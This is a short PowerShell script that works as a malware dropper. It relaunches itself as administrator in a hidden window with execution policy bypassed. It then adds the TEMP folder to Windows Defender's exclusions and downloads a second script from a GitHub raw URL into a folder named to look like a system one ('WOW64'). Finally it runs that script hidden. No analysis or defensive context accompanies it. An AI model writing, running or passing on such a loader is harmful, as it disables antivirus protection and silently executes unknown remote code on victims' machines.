$Elevation = [System.Security.Principal.WindowsPrincipal][System.Security.Principal.WindowsIdentity]::GetCurrent()
$AdminRole = [System.Security.Principal.WindowsBuiltInRole]::Administrator

if (-not $Elevation.IsInRole($AdminRole)) {
    # Relaunch the script as Administrator with hidden window and bypass execution policy
    $arguments = "-ExecutionPolicy Bypass -File '" + $myinvocation.MyCommand.Definition + "'"
    Start-Process powershell -ArgumentList $arguments -Verb RunAs -WindowStyle Hidden
    exit
}

Add-MpPreference -ExclusionPath $env:TEMP

$url = "https://raw.githubusercontent.com/jusnih/x/refs/heads/main/y.ps1"
$folder = "$env:TEMP\WOW64"
$scriptPath = "$folder\y.ps1"

New-Item -Path $folder -ItemType Directory -Force | Out-Null

$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $scriptPath)

Unblock-File -Path $scriptPath

$psPath = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"

Unblock-File -Path $scriptPath

$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = $psPath
$psi.Arguments = "-ExecutionPolicy Bypass -File `"$scriptPath`""
$psi.WindowStyle = 'Hidden'
$psi.CreateNoWindow = $true
$psi.UseShellExecute = $false

[System.Diagnostics.Process]::Start($psi)
